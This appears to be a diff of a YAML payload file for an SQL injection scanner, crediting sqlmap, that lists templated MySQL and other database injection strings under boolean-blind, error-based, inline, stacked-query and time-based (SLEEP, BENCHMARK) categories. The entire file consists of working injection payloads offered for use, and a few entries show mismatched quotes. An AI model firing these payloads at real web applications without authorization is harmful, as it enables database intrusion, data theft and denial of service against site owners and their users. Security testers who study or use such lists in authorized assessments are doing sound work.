@@ -1,22 +1,33 @@
-MySQL:
-  payload_type:
-    simple_error_based:
-                        - "'"
-                        - '--'
-                        - ';'
-                        - '"'
-                        - '/*'
-                        - "'/*"
-                        - "'--"
-                        - '"--'
-                        - "';"
-                        - '";'
-                        - '`'
-    func_error_based:
-                        - "AND '[fix_num]'='[fix_num]'"
-                        - "AND '[fix_num]'='[fix_num]' OR '[rand_num]'='[rand_num]'"
-                        - "AND [fix_num]=[fix_num] OR AND [fix_num]'='[fix_num]' AND '[bool]'='[bool]'"
-                        - "OR [bool]=[bool] AND [rand_str]=[rand_str] OR [rand_num]=[rand_num]"
-    complex_error_based:
-                        - "AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[del_start]',(SELECT (ELT('[fix_num]'='[fix_num]',1))),'[del_stop]','x'))s), 8446744073709551610, 8446744073709551610)))"
-                        - ""
+# Give credit where it is do, thank you @sqlmap devs for the ideas
+# for these payloads, I changed them up a little bit as you can see
+payloads:
+  boolean_blinds:
+                - " AND '[fix_num]'='[fix_num]'"
+                - " OR '[fix_num]'='[fix_num]'"
+                - " OR NOT '[fix_num]'='[rand_num]'"
+                - " AND '[fix_num]'='[fix_num]''[comment]'"
+                - " OR '[fix_num]'='[fix_num]''[comment]'"
+                - " OR NOT '[fix_num]'='[rand_num]''[comment]'"
+  error_based:
+                - " AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[del_start]',(SELECT (ELT('[rand_num]'='[rand_num]',1))),'[del_stop]','x'))s), 8446744073709551610, 8446744073709551610)))"
+                - " OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[del_start]',(SELECT (ELT('[rand_num]'='[rand_num]',1))),'[del_stop]','x'))s), 8446744073709551610, 8446744073709551610)))"
+                - " AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[del_start]',(SELECT (ELT('[rand_num]'='[rand_num]',1))),'[del_stop]')) USING utf8)))"
+                - " OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[del_start]',(SELECT (ELT('[rand_num]'='[rand_num]',1))),'[del_stop]')) USING utf8)))"
+                - " AND EXTRACTVALUE('[rand_num]']',CONCAT('\','[del_start]',(SELECT (ELT('[rand_num]'='[rand_num]',1))),'[del_stop]'))"
+                - " OR EXTRACTVALUE('[rand_num]',CONCAT('\','[del_start]',(SELECT (ELT('[rand_num]'='[rand_num]',1))),'[del_stop]'))"
+  inline_queries:
+                - " (SELECT CONCAT('[del_start]',(SELECT (ELT('[rand_num]'='[rand_num]',1))),'[del_stop]'))"
+                - " SELECT '[del_start]'||(SELECT (CASE WHEN ('[rand_num]'='[rand_num]') THEN 1 ELSE 0 END))||'[del_stop]'"
+                - " SELECT '[del_start]'||(CASE '[rand_num]' WHEN '[rand_num]' THEN 1 ELSE 0 END)||'[del_stop]' FROM RDB$DATABASE"
+  stacked_queries:
+                - ";SELECT IF((['[str]']),SLEEP('[low_level_rand_num]'),'[rand_num]')"
+                - ";SELECT IF((['[str]']),SLEEP('[low_level_rand_num]'),'[rand_num]')"
+                - ";(SELECT * FROM (SELECT(SLEEP('[low_level_rand_num]'-(IF('[str]',0,'[low_level_rand_num]')))))'[rand_num]')"
+                - ";SELECT IF((['[str]']),BENCHMARK(['[low_level_rand_num]']000000,MD5('[str]')),'[rand_num]')"
+                - ";SELECT IF(('[str]'),BENCHMARK('[low_level_rand_num]'000000,MD5('[str]')),'[rand_num]')"
+  time_based_blind:
+                - " AND SLEEP('[low_level_rand_num]')"
+                - " OR SLEEP('[low_level_rand_num]')"
+                - " '[low_level_rand_num]'"
+                - " AND SLEEP('[low_level_rand_num]')'[comment]'"
+                - " OR SLEEP('[low_level_rand_num]')'[comment]'"
